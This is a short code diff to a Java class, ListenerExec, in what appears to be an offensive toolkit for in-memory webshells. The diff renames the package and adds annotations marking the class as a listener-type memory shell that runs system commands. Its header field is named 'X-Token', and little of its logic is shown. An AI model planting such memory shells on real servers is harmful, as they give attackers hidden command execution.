@@ -1,4 +1,7 @@
-package com.ppp.memshell;
+package com.ppp.middleware.memshell;
+
+import com.ppp.annotation.MemShell;
+import com.ppp.annotation.MemShellFunction;
 
 import java.io.InputStream;
 import java.lang.reflect.Field;
@@ -8,6 +11,8 @@ import java.lang.reflect.Method;
 /**
  * @author Whoopsunix
  */
+@MemShell(MemShell.Listener)
+@MemShellFunction(MemShellFunction.Runtime)
 public class ListenerExec implements InvocationHandler {
     private static String HEADER = "X-Token";
 
@@ -17,6 +22,7 @@ public class ListenerExec implements InvocationHandler {
         }
         return null;
     }
+
     public Object getResponse(Object httpServletRequest) {
         Object httpServletResponse = null;
         try {
